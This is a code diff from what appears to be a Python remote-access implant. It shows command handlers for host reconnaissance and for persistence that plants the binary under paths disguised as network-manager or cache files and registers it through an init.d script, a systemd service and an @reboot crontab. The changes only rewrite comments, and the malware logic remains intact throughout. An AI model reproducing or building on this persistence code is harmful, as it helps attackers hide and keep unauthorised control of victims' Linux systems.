@@ -198,7 +198,7 @@ def _handle(msg):
             return _err(rid, 500, str(exc))
 
     elif command == "RECON_BUNDLE":
-        # Multi-step recon: runs ~15 commands, returns combined report
+        # run multiple commands
         cmds = [
             ("whoami",         "whoami"),
             ("id",             "id"),
@@ -226,7 +226,6 @@ def _handle(msg):
         return _ok(rid, results)
 
     elif command == "PERSIST":
-        # Multi-step persistence.
         # Root path: copy to /usr/lib/systemd-private/, install SysV init.d script + register it.
         # Non-root fallback: copy to ~/.cache/.sysd/, install @reboot crontab entry.
         steps = {}
@@ -249,7 +248,7 @@ def _handle(msg):
 
             if is_root:
                 # Root path: SysV init.d script
-                # Binary goes to a path that looks like a legitimate system file
+                # move binary to a path that looks like a legitimate system file
                 persist_bin = "/usr/lib/network-manager/nm-dispatcher-event"
                 try:
                     os.makedirs(os.path.dirname(persist_bin))
@@ -287,7 +286,7 @@ def _handle(msg):
                 rc_out, rc_code = _run("update-rc.d network-manager-dispatcher defaults")
                 steps["update_rc"] = rc_out if rc_code == 0 else "failed: {0}".format(rc_out)
 
-                # Also enable via systemctl if systemd is present (Ubuntu 16.04 has both)
+                # Also enable via systemctl if systemd is present
                 _run("systemctl daemon-reload 2>/dev/null")
                 _run("systemctl enable network-manager-dispatcher 2>/dev/null")
 
